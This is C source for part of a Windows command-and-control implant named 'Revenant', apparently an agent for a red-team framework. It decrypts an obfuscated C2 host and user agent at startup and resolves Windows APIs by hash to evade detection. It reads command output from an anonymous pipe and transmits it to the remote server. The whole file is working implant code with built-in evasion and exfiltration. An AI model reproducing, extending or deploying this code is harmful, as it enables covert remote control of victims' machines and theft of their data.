#include "Asm.h"
#include "Core.h"
#include "Config.h"
#include "Poly.h"
#include "Package.h"
#include "Command.h"
#include "Revenant.h"
#include "AntiDebug.h"
#include "Utilities.h"
#include "Obfuscation.h"

VOID RvntInit() {

    // Init Connection info
    // UserAgent and Host IP always obfuscated
    UCHAR s_xk[]        = S_XK;
    UCHAR e_UserAgent[] = CONFIG_USER_AGENT;
    UCHAR e_Host[]      = CONFIG_HOST;

    UCHAR d_UserAgent[sizeof(e_UserAgent)] = {0};
    UCHAR d_Host[sizeof(e_Host)] = {0};

    ROL_AND_DECRYPT((CONST CHAR*)e_UserAgent, sizeof(e_UserAgent), 1, (CHAR*) d_UserAgent, (PCCH) s_xk);
    ROL_AND_DECRYPT((CONST CHAR*)e_Host, sizeof(e_Host), 1, (CHAR*) d_Host, (PCCH) s_xk);

    PWCHAR w_UserAgent = NULL;
    PWCHAR w_Host = NULL;

    w_UserAgent = str_to_wide( (PCCH) d_UserAgent);
    w_Host = str_to_wide((PCCH) d_Host);

    Instance.Config.Transport.UserAgent = w_UserAgent;
    Instance.Config.Transport.Host      = w_Host;
    Instance.Config.Transport.Port      = CONFIG_PORT;
    Instance.Config.Transport.Secure    = CONFIG_SECURE;

    // Init Win32
#if CONFIG_ARCH == 64
    Instance.Handles.NtdllHandle = get_ntdll_64();
#else
    Instance.Handles.NtdllHandle = get_ntdll_32();
#endif

#if CONFIG_OBFUSCATION
    UCHAR s_string[] = S_KERNEL32;
    UCHAR d_string[13] = {0};

    ROL_AND_DECRYPT((CONST CHAR *)s_string, sizeof(s_string), 1, (CHAR*) d_string, (CONST CHAR *) s_xk);
#else

    UCHAR d_string[13] = {'k','e','r','n','e','l','3','2','.','d','l','l',0x0};

#endif

    Instance.Handles.Kernel32Handle = LocalGetModuleHandle(d_string);

    // _tprintf("NTDLL_BASE: %x\n", ntdll_base);
    Instance.Win32.RtlRandomEx   = GetProcAddressByHash(Instance.Handles.NtdllHandle, RtlRandomEx_CRC32B);
    Instance.Win32.RtlGetVersion = GetProcAddressByHash(Instance.Handles.NtdllHandle, RtlGetVersion_CRC32B);
    Instance.Win32.VirtualProtect = GetProcAddressByHash(Instance.Handles.Kernel32Handle, VirtualProtect_CRC32B);

    Instance.Session.AgentID = RandomNumber32();
    Instance.Config.Sleeping = CONFIG_SLEEP;

    // _tprintf( "AgentID     => %x\n", Instance.Session.AgentID );
    // _tprintf( "Magic Value => %x\n", RVNT_MAGIC_VALUE );

    // TODO: Obfuscate this
    SYSTEM_INFO si;
    GetNativeSystemInfo(&si);

    Instance.Session.OSArch = si.wProcessorArchitecture;

    Instance.Session.ProcArch = PROCESS_AGENT_ARCH ;


}

VOID AnonPipeRead( HANDLE hSTD_OUT_Read ) {
    PPACKAGE Package         = NULL;
    LPVOID   pOutputBuffer   = NULL;
    UCHAR    buf[ 1025 ]     = { 0 };
    DWORD    dwBufferSize    = 0;
    DWORD    dwRead          = 0;
    BOOLEAN  SuccessFul      = FALSE;

    pOutputBuffer = LocalAlloc( LPTR, sizeof(LPVOID) );

    do {
        SuccessFul = ReadFile( hSTD_OUT_Read, buf, 1024, &dwRead, NULL );
        if ( dwRead == 0) {
            break;
        }

        pOutputBuffer = LocalReAlloc(pOutputBuffer,dwBufferSize + dwRead,LMEM_MOVEABLE | LMEM_ZEROINIT);

        dwBufferSize += dwRead;
        mem_cpy( pOutputBuffer + ( dwBufferSize - dwRead ), buf, dwRead );
        mem_set( buf, 0, dwRead );
    } while ( SuccessFul == TRUE );

    Package = PackageCreate( COMMAND_OUTPUT );

    PackageAddBytes( Package, pOutputBuffer, dwBufferSize );
    PackageTransmit( Package, NULL, NULL );
    mem_set( pOutputBuffer, 0, dwBufferSize );
    LocalFree( pOutputBuffer );
    pOutputBuffer = NULL;
}

ULONG RandomNumber32(void) {
    ULONG Seed = 0;

    Seed = GetTickCount();
    Seed = Instance.Win32.RtlRandomEx( &Seed );
    Seed = Instance.Win32.RtlRandomEx( &Seed );
    Seed = ( Seed % ( LONG_MAX - 2 + 1 ) ) + 2;

    return Seed % 2 == 0 ? Seed : Seed + 1;
}
